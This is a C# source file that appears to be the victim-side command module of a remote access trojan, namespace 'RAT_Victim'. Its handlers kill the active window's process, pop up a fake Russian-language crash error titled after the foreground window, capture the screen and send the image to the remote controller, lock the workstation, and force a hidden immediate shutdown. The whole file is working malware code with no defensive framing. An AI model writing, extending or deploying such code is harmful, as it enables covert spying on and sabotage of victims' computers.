using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

#pragma warning disable IDE0051 // Remove unused private members (used by reflection)

namespace RAT_Victim
{
    static class Commands
    {
        static ImageConverter converter = new ImageConverter();

        static void CloseActiveWindow()
        {
            var window = WinAPI.GetForegroundWindow();
            WinAPI.GetWindowThreadProcessId(window, out var processId);
            var process = WinAPI.OpenProcess(1, true, processId);
            WinAPI.TerminateProcess(process, 0);
        }

        static void ShowMessageBox()
        {
            var window = WinAPI.GetForegroundWindow();
            StringBuilder builder = new StringBuilder();
            WinAPI.GetWindowText(window, builder, builder.MaxCapacity);
            WinAPI.MessageBox(window,
                "Ошибка при запуске приложения (0xc0000005). Для выхода из приложения нажмите кнопку \"OK\".",
                builder + " - Ошибка приложения", 0x10);
        }

        static void TakeScreenshot()
        {
            Size screenSize = Screen.PrimaryScreen.Bounds.Size;
            Bitmap bitmap = new Bitmap(screenSize.Width, screenSize.Height);
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            byte[] data = (byte[])converter.ConvertTo(bitmap, typeof(byte[]));
            Program.client.Send(data);
        }

        static void Lock()
        {
            WinAPI.LockWorkStation();
        }

        static void Shutdown()
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo("cmd", "/C shutdown /s /t 0")
                { WindowStyle = ProcessWindowStyle.Hidden }
            };
            process.Start();
        }

        public static string GetActiveWindowTitle()
        {
            var window = WinAPI.GetForegroundWindow();
            StringBuilder builder = new StringBuilder();
            WinAPI.GetWindowText(window, builder, builder.MaxCapacity);
            return builder.ToString();
        }

        public static void ShowMessage(string message)
        {
            WinAPI.MessageBox(WinAPI.GetForegroundWindow(), message, GetActiveWindowTitle(), 0x40);
        }
    }
}
